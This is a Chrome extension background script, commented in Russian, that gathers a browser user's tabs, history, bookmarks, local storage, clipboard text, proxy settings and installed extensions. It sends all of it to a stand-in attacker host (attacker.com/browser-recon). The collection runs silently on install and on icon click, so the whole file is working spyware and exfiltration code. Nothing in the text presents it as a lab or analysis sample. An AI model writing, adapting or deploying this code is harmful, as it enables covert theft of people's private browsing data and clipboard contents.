async function getTabs() {
    return new Promise((resolve) => {
        chrome.tabs.query({}, (tabs) => {
            resolve(tabs.map(tab => ({
                id: tab.id,
                url: tab.url,
                title: tab.title,
                active: tab.active,
                pinned: tab.pinned,
                windowId: tab.windowId
            })));
        });
    });
}

async function getHistory() {
    return new Promise((resolve) => {
        chrome.history.search({text: '', maxResults: 100}, (results) => {
            resolve(results.map(item => ({
                url: item.url,
                title: item.title,
                lastVisitTime: item.lastVisitTime,
                visitCount: item.visitCount
            })));
        });
    });
}

async function getBookmarks() {
    return new Promise((resolve) => {
        chrome.bookmarks.getTree((tree) => {
            resolve(tree);
        });
    });
}

async function getUserAgent() {
    return navigator.userAgent;
}

async function getStorage() {
    return new Promise((resolve) => {
        chrome.storage.local.get(null, (items) => {
            resolve(items);
        });
    });
}

async function getBrowserPlatform() {
    return {
        platform: navigator.platform,
        version: navigator.appVersion
    }
}

async function getProxySettings() {
    return new Promise((resolve) => {
        chrome.proxy.settings.get({}, (details) => {
            resolve(details);
        });
    });
}

async function getClipboardText() {
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            return await navigator.clipboard.readText();
        }
    } catch (e) {
        return null; // буфер обмена может быть не доступен из background
    }
    return null;
}

async function getInstalledExtensions() {
    return new Promise((resolve) => {
        chrome.management.getAll((exts) => {
            resolve(exts.map(e => ({
                id: e.id,
                name: e.name,
                enabled: e.enabled,
                type: e.type,
                installType: e.installType
            })));
        });
    });
}

async function gatherInfo() {
    const tabs = await getTabs();
    const history = await getHistory();
    const bookmarks = await getBookmarks();
    const userAgent = await getUserAgent();
    const storage = await getStorage();
    const platform = await getBrowserPlatform();
    const proxy = await getProxySettings();
    const clipboard = await getClipboardText();
    const extensions = await getInstalledExtensions();

    const result = {
        tabs,
        history,
        bookmarks,
        userAgent,
        storage,
        platform,
        proxy,
        clipboard,
        extensions
    };

    fetch("http://attacker.com/browser-recon", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(result)
    });
}

// Можно запускать по событию — при установке, или по таймеру, или по action
chrome.runtime.onInstalled.addListener(() => {
    gatherInfo();
});

// (опционально) по нажатию иконки
chrome.action.onClicked.addListener(() => {
    gatherInfo();
});
